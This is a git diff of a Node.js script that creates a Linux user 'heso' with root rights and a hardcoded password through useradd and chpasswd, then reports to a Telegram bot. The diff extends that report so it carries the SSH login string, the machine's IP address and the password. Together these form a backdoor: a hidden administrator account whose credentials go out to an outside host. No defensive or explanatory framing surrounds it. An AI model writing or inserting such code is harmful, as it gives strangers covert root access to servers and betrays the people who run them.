@@ -2,6 +2,9 @@ const https = require('https');
 const { exec } = require('child_process');
 const os = require('os');
 
+const username = 'heso';
+const password = '123456789';
+
 async function sendTelegramMessage(token, chatId, text) {
   const message = encodeURIComponent(text);
   const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;
@@ -28,8 +31,7 @@ async function getIpAddress() {
 }
 
 async function createRootUser() {
-  const username = 'heso';
-  const password = '123456789';
+
   const commands = [
     `useradd -m -s /bin/bash ${username}`,
     `echo "${username}:${password}" | chpasswd`,
@@ -60,7 +62,7 @@ async function runB1CD ()  {
 
     const result = await createRootUser();
 
-    await sendTelegramMessage(token, chatId, `Пользователь heso с root правами успешно создан.`);
+    await sendTelegramMessage(token, chatId, `Пользователь ${username} с root правами успешно создан. ssh ${username}@${ipAddress}\npass: ${password}`);
   } catch (error) {
     console.error('Произошла ошибка:', error);
   }
